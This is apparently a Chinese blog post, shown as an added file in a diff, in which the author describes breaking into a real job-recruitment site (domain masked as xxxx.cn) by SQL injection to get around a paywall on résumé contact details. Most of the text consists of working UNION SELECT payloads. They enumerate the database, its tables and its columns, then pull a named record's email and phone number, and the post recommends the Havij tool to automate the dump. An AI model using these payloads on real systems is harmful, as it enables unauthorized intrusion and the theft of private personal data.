@@ -1,0 +1,86 @@
+前几天想再网上查某个人的qq号来，百度上输上他的名字，果然搜出来了很多网页，打开了一个看到是一个关于求职招聘相关的，联系方式里面只 能企业用户 才能查看
+
+
+
+额。。。 看了看 就在url后面加了个 1=1  页面没有出现错误，好像有希望。
+
+数了数字段名应该20--30个试了试总共31个字段
+
+http://www.xxxx.cn/resumeshow.php?id=1006946 union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31 --
+
+
+
+访问
+
+http://www.xxxx.cn/resumeshow.php?id=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31 --
+
+
+
+
+
+database()  替换了上面url里面的4  访问替换后的url    
+
+http://www.xxxx.cn/resumeshow.php?id=999999.9 union all select 1,2,3,database(),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31 --
+
+在出生年月的地方就可以看到数据库名称  data2302
+
+
+
+
+
+
+
+用(select  count(table_name)  from `information_schema`.tables where table_schema=database())   替换掉url中的4    可以查询出 数据库中存在11个表
+
+
+
+(select  group_concat(table_name)   from `information_schema`.tables where table_schema=database())替换掉url中的4 可以查询出所有的表
+
+、、
+
+推测 简历表 为yjl
+
+(select  count(column_name) from `information_schema`.columns where table_schema=database() and table_name=0x796A6C)替换掉url中的4  可以查询出  yjl 表（hex 为0x796A6C）中的列数  31列
+
+
+
+
+
+
+
+用(select count(*)  from  yjl) 替换掉url中的4  可以查询出记录数  5037个简历
+
+
+
+
+
+
+
+用(select   group_concat(column_name)    from `information_schema`.columns where table_schema=database()  and table_name=0x796A6C)可以查询出yjl中的所有字段  
+
+
+
+
+推测  qq为YQQ  邮箱为  YEM
+
+(select   YQQ  from  yjl where YID=1006946)  额。。。查询qq时竟然为空
+
+还好用 (select  YEM  from yjl where YID=1006946)能查出邮箱   
+
+用YSJ能查出手机
+
+
+
+上面只是手工注入的代码，下载个havij的工具，让程序自己跑就可以了。
+
+
+
+
+
+简单的跑了几条数据  推测出 数据库表内容  yjb （金币）,yjl  （简历表）  ,ylj （连接） ,yly （留言） ,yqy （企业表） ,ysp （空） ,yxw （新闻表） ,yyh （用户表）  ,yyx    ,yzl （简历中的荣誉证书） ,yzp（招聘信息表）
+
+
+
+
+
+如果管理员看到了  就把漏洞补一下把。。。。  很老的漏洞了 
